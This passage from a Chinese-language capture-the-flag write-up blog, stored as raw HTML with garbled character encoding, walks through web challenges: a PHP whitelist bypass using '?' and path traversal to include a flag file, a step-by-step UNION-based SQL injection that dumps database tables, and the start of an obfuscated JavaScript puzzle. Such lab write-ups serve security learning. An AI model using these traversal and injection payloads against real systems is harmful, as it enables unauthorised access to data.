class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment">//ç™½åå•</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœä¸å­˜åœ¨ï¼ˆisset()ï¼‰æˆ–è€…ä¸ä¸ºå­—ç¬¦ä¸²ï¼ˆis_string()ï¼‰</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,//è¦æˆªå–çš„å­—ç¬¦ä¸²</span><br><span class="line">                <span class="number">0</span>,//èµ·å§‹ä½ç½®</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//æˆªå–é•¿åº¦</span><br><span class="line">                //è¿”å›ï¼Ÿåœ¨<span class="variable">$page</span>.?å­—ç¬¦ä¸²ä¸­å‡ºç°çš„ä½ç½®</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);<span class="comment">//è§£ç </span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,//è¦æˆªå–çš„å­—ç¬¦ä¸²</span><br><span class="line">                <span class="number">0</span>,//èµ·å§‹ä½ç½®</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//æˆªå–é•¿åº¦</span><br><span class="line">                //è¿”å›ï¼Ÿåœ¨<span class="variable">$_page</span>å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">    <span class="comment">//å¦‚æœä¼ çš„å‚æ•°ä¸æ˜¯ç©ºçš„ï¼Œå¹¶ä¸”æ˜¯å­—ç¬¦ä¸²ï¼Œè°ƒç”¨checkFileå‡½æ•°è¿”å›ä¸ºtrue</span></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="comment">//å¯¹ä¼ æ¥çš„å‚æ•°è¿›è¡ŒåŒ…å«</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">//å¦åˆ™å°±è¾“å‡ºå›¾ç‰‡</span></span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ²¡æœ‰flagçš„çº¿ç´¢ï¼Œä½†çœ‹åˆ°ä¸€ä¸ªhint.phpæ–‡ä»¶</p><p>è®¿é—®<code>http://111.200.241.244:59132/hint.php</code></p><p><img src="/2022/06/21/Gongfang-wp/image-20220703105453437.png" alt="image-20220703105453437"></p><p>çŸ¥é“äº†flagåœ¨ffffllllaaaaggggæ–‡ä»¶é‡Œ</p><p>ç„¶åå¼€å§‹åˆ†æsource.phpä»£ç ï¼ˆå¯ä»¥çœ‹çœ‹æºç æ³¨é‡Šï¼‰</p><p>åˆ†æï¼š</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå…³é”®åœ¨äº checkfile å‡½æ•°ï¼Œè¦è®©å®ƒè¿”å›ä¸ºtureæ‰èƒ½å¤Ÿå®ç°æ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬èƒ½æ§åˆ¶çš„å˜é‡æ˜¯fileï¼Œ<u>pageå˜é‡å®é™…æ˜¯fileå˜é‡çš„å½¢å‚ï¼Œç”±checkfileå‡½æ•°ä¼ è¿‡å»</u>ï¼Œä¹Ÿå°±æ˜¯fileå˜é‡è¦æ»¡è¶³æ‰€æœ‰çš„ifæ¡ä»¶ï¼Œæ‰èƒ½è¿”å›tureè€Œä¸æ˜¯åªæ˜¾ç¤ºå›¾ç‰‡</p><p>å…ˆåˆ†æcheckfileå‡½æ•°é‡Œçš„å››ä¸ªifæ¡ä»¶æ»¡è¶³è¦æ±‚ï¼Œé¿å…æ‰§è¡Œreturn false</p><p>ç¬¬ä¸€ä¸ªif</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœä¸å­˜åœ¨ï¼ˆisset()ï¼‰æˆ–è€…ä¸ä¸ºå­—ç¬¦ä¸²ï¼ˆis_string()ï¼‰</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¯­å¥é‡Œå­˜åœ¨return falseï¼Œæ‰€ä»¥è¦ä¼ å…¥çš„<u>å˜é‡pageå­˜åœ¨ä¸”ä¸ºå­—ç¬¦ä¸²</u>ï¼Œä½¿å¾—ifè¯­å¥ä¸ºå‡ï¼Œå°±ä¸ä¼šæ‰§è¡Œreturn falseï¼Œè¿™ä¸ªæœ¬èº«å°±æ»¡è¶³ï¼Œæ‰€ä»¥å¯ä»¥ä¸è€ƒè™‘</p><p>ç¬¬äºŒä¸ªif</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line"><span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æ˜¯source.phpæˆ–è€…hint.phpï¼Œæ»¡è¶³whitelist(ç™½åå•)ï¼Œå¦‚æœè¿˜ä¸æ»¡è¶³ç»§ç»­å¾€ä¸‹åˆ¤æ–­ï¼Œæ»¡è¶³å°±è·³å‡ºcheckfileå‡½æ•°</p><p>ç¬¬ä¸‰ä¸ªifï¼Œç»“åˆå…¶å‰é¢ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">               <span class="variable">$page</span>,//è¦æˆªå–çš„å­—ç¬¦ä¸²</span><br><span class="line">               <span class="number">0</span>,//èµ·å§‹ä½ç½®</span><br><span class="line">               <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//æˆªå–é•¿åº¦</span><br><span class="line">               //è¿”å›ï¼Ÿåœ¨<span class="variable">$page</span>.?å­—ç¬¦ä¸²ä¸­å‡ºç°çš„ä½ç½®</span><br><span class="line">           );</span><br><span class="line">           <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">           <span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>å–ä¼ å…¥pageå‚æ•°é¦–æ¬¡å‡ºç°?å‰çš„éƒ¨åˆ†ï¼Œå†è¿›è¡Œç™½åå•åˆ¤æ–­ï¼Œå³æ˜¯å¦å­˜åœ¨source.phpæˆ–è€…hint.phpï¼Œå¦‚æœè¿˜ä¸æ»¡è¶³ç»§ç»­å¾€ä¸‹åˆ¤æ–­ï¼Œæ»¡è¶³å°±è·³å‡ºcheckfileå‡½æ•°</p><p>ç¬¬å››ä¸ªif</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);<span class="comment">//è§£ç </span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,//è¦æˆªå–çš„å­—ç¬¦ä¸²</span><br><span class="line">                <span class="number">0</span>,//èµ·å§‹ä½ç½®</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//æˆªå–é•¿åº¦</span><br><span class="line">                //è¿”å›ï¼Ÿåœ¨<span class="variable">$_page</span>å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>å…ˆæŠŠå‚æ•°è¿›è¡Œurlè§£ç ï¼Œç„¶åå’Œç¬¬ä¸‰ä¸ªifä¸€æ ·ï¼Œå–ä¼ å…¥pageå‚æ•°é¦–æ¬¡å‡ºç°?å‰çš„éƒ¨åˆ†ï¼Œå†è¿›è¡Œç™½åå•åˆ¤æ–­ï¼Œå³æ˜¯å¦å­˜åœ¨source.phpæˆ–è€…hint.phpï¼Œå¦‚æœè¿˜ä¸æ»¡è¶³ç»§ç»­å¾€ä¸‹åˆ¤æ–­ï¼Œæ»¡è¶³å°±è·³å‡ºcheckfileå‡½æ•°</p><hr><p>è‡³äº</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br></pre></td></tr></table></figure><p>åªè¦fileä¸ä¸ºç©ºï¼Œä¸”ä¸ºå­—ç¬¦ä¸²å³å¯ï¼Œå¯ä»¥æ»¡è¶³ä¸è€ƒè™‘</p><p>æ‰€ä»¥åªæœ‰ä¸‹é¢ä¸¤ç§</p><p><code>http://111.200.241.244:59132/source.php?file=source.php?(payload)</code></p><p><code>http://111.200.241.244:59132/source.php?file=hint.php?(payload)</code></p><p>ç”±PHP4-7çš„includeå‡½æ•°çš„ç‰¹æ€§</p><p><img src="https://img-blog.csdnimg.cn/20200319173934886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l5Ynp6eg==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨payloadä¸ŠåŠ ä¸Š<code>/../../../../../../ffffllllaaaagggg</code>ï¼Œè¿™é‡Œå¯åªåŠ å››å±‚..&#x2F;å³å¯ï¼Œä½†ä¹Ÿå¯ä»¥åŠ å¤šä¸ªè¿”å›ä¸Šä¸ªç›®å½•ï¼Œä¹Ÿå¯ä»¥ä¾æ¬¡è¯•è¯•</p><p>å¾—åˆ°flag</p><p><strong>è¡¥å……</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œä¹‹å‰æˆ‘ä»¬å­¦è¿‡ <span class="title function_ invoke__">substr</span>() å‡½æ•°ï¼Œå®ƒåªé’ˆå¯¹è‹±æ–‡å­—ç¬¦ï¼Œå¦‚æœè¦åˆ†å‰²çš„ä¸­æ–‡æ–‡å­—åˆ™éœ€è¦ä½¿ç”¨ <span class="title function_ invoke__">mb_substr</span>()ã€‚</span><br><span class="line">å®ä¾‹</span><br><span class="line">ä»å­—ç¬¦ä¸²ä¸­è¿”å› <span class="string">&quot;èœé¸Ÿ&quot;</span>ï¼š</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mb_substr</span>(<span class="string">&quot;èœé¸Ÿæ•™ç¨‹&quot;</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// è¾“å‡ºï¼šèœé¸Ÿ</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">----------------</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span>()ï¼šè¿”å›è¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²åœ¨åˆ«ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span> (haystack ,needle )</span><br><span class="line">haystackï¼šè¦è¢«æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">needleï¼šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">----------------</span><br><span class="line"> in_arrayå‡½æ•°åŠŸèƒ½æ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼</span><br></pre></td></tr></table></figure><h2 id="11-NewsCenter"><a href="#11-NewsCenter" class="headerlink" title="11.NewsCenter"></a>11.NewsCenter</h2><h3 id="1-é¢˜ç›®æè¿°-20"><a href="#1-é¢˜ç›®æè¿°-20" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2ï¼‰wp-5"><a href="#2ï¼‰wp-5" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>è¯¥é¢˜è€ƒæŸ¥çš„æ˜¯SQLæ³¨å…¥ï¼Œå¦‚æœä¸æ¸…æ¥šå¼€å§‹çœ‹åˆ°è¾“å…¥æ¡†ï¼Œå°±åº”è¯¥è¯•è¯•å„ç§æ–¹å¼ï¼Œåˆ†æå­˜åœ¨ä»€ä¹ˆæ¼æ´ï¼Œæ¯”å¦‚xssæˆ–sqlç­‰ç­‰</p><p>å¼€å§‹å…ˆåˆ¤æ–­sqlæ³¨å…¥å­˜åœ¨</p><p>è¾“å…¥**1â€™**ï¼ŒæŠ¥é”™è¿”å›ç©ºç™½é¡µé¢</p><p>ç„¶ååˆ¤æ–­å­—æ®µæ•°</p><p>å½“è¾“å…¥è¯­å¥ä¸º</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>è¿”å›ç©ºç™½é¡µé¢ï¼Œäºæ˜¯åˆ¤æ–­å­—æ®µæ•°ä¸º3</p><p>ç„¶åè”åˆæ³¨å…¥</p><p>å…ˆåˆ¤æ–­æ•°æ®çˆ†å‡ºå£</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;  <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/Gongfang-wp/image-20220703204402467.png" alt="image-20220703204402467"></p><p>å¾—å‡ºæ•°æ®åœ¨2ï¼Œ3ä½ç½®å¤„è¾“å‡º</p><p>ç„¶åæŒ‰ç…§æ ‡å‡†sqlæ³¨å…¥æµç¨‹å³å¯</p><p>å…ˆçœ‹æ•°æ®åº“å’Œç‰ˆæœ¬å·</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;  <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>(),<span class="built_in">version</span>()<span class="meta">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/Gongfang-wp/image-20220703204520282.png" alt="image-20220703204520282"></p><p>å¾—åˆ°æ•°æ®åº“åä¸º<strong>news</strong>ï¼ŒMySQLç‰ˆæœ¬ä¸º<strong>5.5.61</strong></p><p>ç„¶åæŸ¥çœ‹newsåº“çš„è¡¨å</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=<span class="string">&quot;news&quot;</span>),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/Gongfang-wp/image-20220703205326915.png" alt="image-20220703205326915"></p><p>å¾—åˆ°ä¸¤ä¸ªè¡¨å<strong>news</strong>å’Œ<strong>secret_table</strong></p><p>flagè‚¯å®šåœ¨<strong>secret_table</strong>é‡Œ</p><p>æŸ¥çœ‹<strong>secret_table</strong>åˆ—</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span>  union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">&quot;secret_table&quot;</span>),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/Gongfang-wp/image-20220703205526044.png" alt="image-20220703205526044"></p><p>çœ‹åˆ°fl4gï¼Œå°è¯•æŸ¥çœ‹å…¶æ•°æ®</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span>  union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> fl4g  <span class="keyword">from</span> secret_table),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/Gongfang-wp/image-20220703205758800.png" alt="image-20220703205758800"></p><p>å¾—åˆ°flag</p><p>è¿™é‡Œç”¨sqlmapä¹Ÿå¯ä»¥ï¼Œä½†è¿˜æ˜¯è¯•è¯•æ‰‹å·¥æ³¨å…¥æ›´å¥½</p><h2 id="12-NaNaNaNNaN-Batman"><a href="#12-NaNaNaNNaN-Batman" class="headerlink" title="12.NaNaNaNNaN-Batman"></a>12.NaNaNaNNaN-Batman</h2><h3 id="1-é¢˜ç›®æè¿°-21"><a href="#1-é¢˜ç›®æè¿°-21" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2ï¼‰wp-6"><a href="#2ï¼‰wp-6" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>è¿™ä¸ªå¼€å§‹æœ‰ç‚¹æ‡µï¼Œå€Ÿé‰´äº†å¤§ä½¬çš„wpï¼Œæ‰ç†è§£äº†ä¸€äº›ï¼Œéœ€è¦wpå¯ä»¥è®¤çœŸçœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼Œä»¥ä¸‹åªåŠ ä¸Šä¸ªäººç†è§£å’Œä¸ªäººè®¤ä¸ºæ–‡ç« é‡ç‚¹</p><p><a href="https://blog.csdn.net/qq_41617034/article/details/91946853">åŸæ–‡é“¾æ¥</a></p><p>jsæºä»£ç åˆ†æï¼š</p><p>_ç­‰äºä¸€ä¸ª$å‡½æ•°å†…å®¹</p><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=&#x27;<span class="function"><span class="keyword">function</span> $<span class="params">()</span></span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªè¾“å…¥æ¡†</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="attribute">id</span>=<span class="string">&quot;c&quot;</span>&gt;&lt; <span class="attribute">onclick</span>=$()&gt;Ok&lt;/&gt;\&#x27;);</span><br></pre></td></tr></table></figure><pre><code>***æ ¸å¿ƒä»£ç ï¼š***evalå‡½æ•°ï¼Œè¿™æ˜¯æ‰§è¡Œå‡½æ•°ï¼›è¿™é‡Œæ‰§è¡Œäº†_å˜é‡ä¸­çš„å†…å®¹ä¹Ÿå°±æ˜¯&#39;&#39;ä¸­çš„å†…å®¹ï¼Œä½†æ˜¯ï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œå®ƒå¹¶æ²¡æœ‰æ‰§è¡Œ$()å‡½æ•°ï¼Œä»…ä»…æ‰§è¡Œäº†å­—ç¬¦ä¸²è€Œå·²ï¼ˆä»è€Œå¯¼è‡´ä¹±ç ï¼‰ï¼Œå› è€Œé¡µé¢htmlé¡µé¢æ²¡æœ‰ä»»ä½•æ˜¾ç¤ºï¼Œåªæ˜¾ç¤ºäº†inputæ ‡ç­¾çš„å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬æƒ³è®©æºä»£ç æ­£å¸¸æ˜¾ç¤ºå‡ºæ¥ï¼Œä¸è¿›è¡Œæ‰§è¡Œï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å°±ç”¨åˆ°äº†alertå¼¹çª—ï¼ˆå°†evalå‡½æ•°æ”¹ä¸ºalertï¼‰ï¼Œå°†ä¹±ç çš„$()å‡½æ•°æºç å®Œæ•´æ˜¾ç¤ºå‡ºæ¥è¿™é‡Œå¯ä»¥ä½¿ç”¨æµè§ˆå™¨æ‰“å¼€ï¼Œä¹Ÿå¯ä»¥å°†ä¿®æ”¹åçš„æºä»£ç æ”¾å…¥æ§åˆ¶å°æ‰§è¡Œï¼ˆæ”¾å…¥æ§åˆ¶å°éœ€è¦æ³¨æ„åˆ é™¤scriptå‰åæ ‡ç­¾ï¼‰</code></pre><p>æµè§ˆå™¨æ‰“å¼€ï¼š <img src="https://img-blog.csdnimg.cn/20200306183621819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function $()&#123;</span><br><span class="line">var e=document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length==16)</span><br><span class="line">   if(e.match(/^be0f23/)!=null)</span><br><span class="line">      if(e.match(/233ac/)!=null)</span><br><span class="line">         if(e.match(/e98aa$/)!=null)</span><br><span class="line">             if(e.match(/c7be9/)!=null)&#123;</span><br><span class="line">             var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">             var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">             var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">             var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">             var s=[t,n,r,i];</span><br><span class="line">             for(var o=0;o&lt;13;++o)&#123;</span><br><span class="line">             document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;</span><br><span class="line">             &#125;</span><br><span class="line">&#125;</span><br><span class="line">document.write(&#x27;<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;c&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> Î¿<span class="attr">nclick</span>=<span class="string">$()</span>&gt;</span>Ok<span class="tag">&lt;/<span class="name">button</span>&gt;</span>&#x27;);</span><br><span class="line">delete _</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ç»ˆæç›®æ ‡æ˜¯æ‰“å°å‡º</p><p><code>document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;</code></p><p>å› æ­¤æˆ‘ä»¬è¦æ»¡è¶³å…³é”®å˜é‡eçš„æ¡ä»¶</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e.<span class="built_in">length</span>==<span class="number">16</span></span><br><span class="line">e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/c7be9/</span>)!=<span 